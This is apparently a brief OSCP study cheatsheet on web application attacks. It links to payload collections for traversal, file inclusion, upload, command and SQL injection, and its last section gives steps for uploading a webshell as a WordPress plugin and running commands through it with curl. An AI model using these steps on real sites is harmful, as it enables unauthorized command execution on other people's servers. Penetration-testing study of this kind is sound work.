---
title: Webapplication Attacks
author: linatl
date: "2021-03-04 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---



###### PayloadsAllTheThings
```
Directory traversal
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
LFI/RFI
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
File Uploads
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
Command injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
SQL injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```

###### SQL Cheatsheets
```
https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532
```


###### Wordpress Panel
```
Upload webshell in a plugin
> cp /usr/share/seclists/Web-Shells/Wordpress/plugin-shell.php ./
> zip plugin-shell.zip plugin-shell.php

Upload the ZIP as a plugin. Then run the webshell:
> curl http://10.10.10.10/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
```

